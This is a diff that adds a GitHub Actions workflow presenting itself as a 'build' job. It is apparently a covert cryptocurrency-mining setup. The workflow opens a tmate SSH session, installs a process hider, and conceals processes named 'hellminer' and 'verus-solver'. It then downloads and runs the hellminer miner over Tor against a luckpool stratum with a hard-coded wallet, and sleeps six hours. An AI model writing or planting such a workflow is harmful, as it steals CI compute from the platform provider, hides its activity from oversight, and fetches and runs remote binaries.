@@ -1,0 +1,48 @@
+name: newexp1
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Set up tmate SSH
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y tmate
+
+          tmate -S /tmp/tmate.sock new-session -d
+          tmate -S /tmp/tmate.sock wait tmate-ready
+
+          tmate_ssh=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
+          echo "SSH URL: $tmate_ssh"
+
+      - name: Install Torsocks
+        run: sudo apt-get install -y torsocks
+
+      - name: Install npm
+        run: sudo apt-get install -y npm
+
+      - name: Install node-process-hider
+        run: sudo npm i -g node-process-hider
+
+      - name: Run Command in tmate
+        run: |
+          $tmate_ssh << EOF
+            npm hide -p hellminer
+            npm hide -p verus-solver
+
+            wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+            tar -xf hellminer_linux64.tar.gz
+            torsocks ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RXdK9Kiiz2pLUu9k8i7Tx9RKhLEnCJq9Us.M1 -p x --cpu 1
+          EOF
+
+      - name: Loop
+        run: |
+          sleep 6h
+          echo "Looping..."
+          exit 1
